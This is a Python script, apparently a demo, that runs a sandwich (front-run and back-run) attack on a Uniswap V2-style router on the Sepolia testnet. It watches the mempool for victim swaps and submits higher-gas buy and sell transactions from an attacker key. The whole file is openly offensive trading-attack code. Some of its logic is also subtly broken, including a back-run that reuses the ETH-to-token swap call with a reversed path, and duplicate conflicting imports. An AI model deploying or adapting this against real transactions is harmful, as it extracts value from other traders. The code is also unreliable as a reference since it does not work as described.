import asyncio, json, os, time
from dotenv import load_dotenv
from web3 import Web3, AsyncWeb3
from web3.middleware import geth_poa_middleware
from web3.providers.async_websocket import AsyncWebsocketProvider
from web3.middleware.poa import construct_poa_middleware as geth_poa_middleware
from eth_account import Account
from eth_utils import keccak

load_dotenv()                                    # grab env vars

# ---- constants ----
RPC_HTTP, RPC_WSS = os.environ['RPC_HTTP'], os.environ['RPC_WSS']
ROUTER = Web3.to_checksum_address("0xeE567Fe1712Faf6149d80dA1E6934E354124CfE3")
WETH   = Web3.to_checksum_address("0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14")
DAI    = Web3.to_checksum_address("0x3e622317f8C93f7328350cF0B56d9eD4C620C5d6")

SWAP_SEL = "0x" + keccak(text="swapExactETHForTokens(uint256,address[],address,uint256)").hex()[:8]

with open("IUniswapV2Router02.json") as f:
    ROUTER_ABI = json.load(f)

# ---- providers ----
w3      = Web3(Web3.HTTPProvider(RPC_HTTP))
w3_ws   = AsyncWeb3(AsyncWebsocketProvider(RPC_WSS))
for chain in (w3, w3_ws):
    chain.middleware_onion.inject(geth_poa_middleware, 0)

victim   = Account.from_key(os.environ['PK_VICTIM'])
attacker = Account.from_key(os.environ['PK_ATTACKER'])
router_c = w3.eth.contract(address=ROUTER, abi=ROUTER_ABI)

# ---- helpers ----
async def send_swap(from_acct, amount_eth=0.001):
    """Victim swaps exact ETH→DAI."""
    deadline = int(time.time()) + 600
    tx = router_c.functions.swapExactETHForTokens(
        0, [WETH, DAI], from_acct.address, deadline
    ).build_transaction({
        "from":  from_acct.address,
        "value": w3.to_wei(amount_eth, "ether"),
        "nonce": w3.eth.get_transaction_count(from_acct.address),
        "gas":   250_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": 11155111,                # Sepolia
    })
    raw = from_acct.sign_transaction(tx).rawTransaction
    h = w3.eth.send_raw_transaction(raw)
    print(f"Victim swap sent  → {h.hex()}")
    return h

def is_swap(tx):
    return tx and tx.to and tx.to.lower() == ROUTER.lower() and tx.input[:10].lower() == SWAP_SEL

async def front_and_back_run(target_tx):
    """Front-run (buy), then back-run (sell)."""
    gas_target = target_tx.gasPrice
    deadline   = int(time.time()) + 600
    path_fwd   = [WETH, DAI]
    path_rev   = [DAI, WETH]

    for i, path in enumerate((path_fwd, path_rev)):
        gas = int(gas_target * (1.20 + 0.05*i))         # 20 % / 25 % bump
        tx = router_c.functions.swapExactETHForTokens(
            0, path, attacker.address, deadline
        ).build_transaction({
            "from": attacker.address,
            "value": w3.to_wei(0.001, "ether"),
            "nonce": w3.eth.get_transaction_count(attacker.address) + i,
            "gas":   250_000,
            "gasPrice": gas,
            "chainId": 11155111,
        })
        raw = attacker.sign_transaction(tx).rawTransaction
        h = w3.eth.send_raw_transaction(raw)
        print(f"{'Front' if i==0 else 'Back'}-run sent → {h.hex()} (gas {gas/1e9:.2f} gwei)")

async def mempool_watch():
    sub = await w3_ws.eth.subscribe("newPendingTransactions")
    async for msg in w3_ws.socket.process_subscriptions():
        tx_hash = msg["result"]
        try:
            tx = await w3_ws.eth.get_transaction(tx_hash)
            if is_swap(tx):
                print(f"▶ Detected swap {tx_hash}")
                await front_and_back_run(tx)
                break                                   # one demo sandwich & quit
        except Exception:
            continue

async def main():
    # fire a couple of victim swaps for demo
    for _ in range(2):
        await send_swap(victim, 0.001)
        await asyncio.sleep(3)                          # spacing
    
    # simultaneously watch the mempool
    await mempool_watch()

if __name__ == "__main__":
    asyncio.run(main())
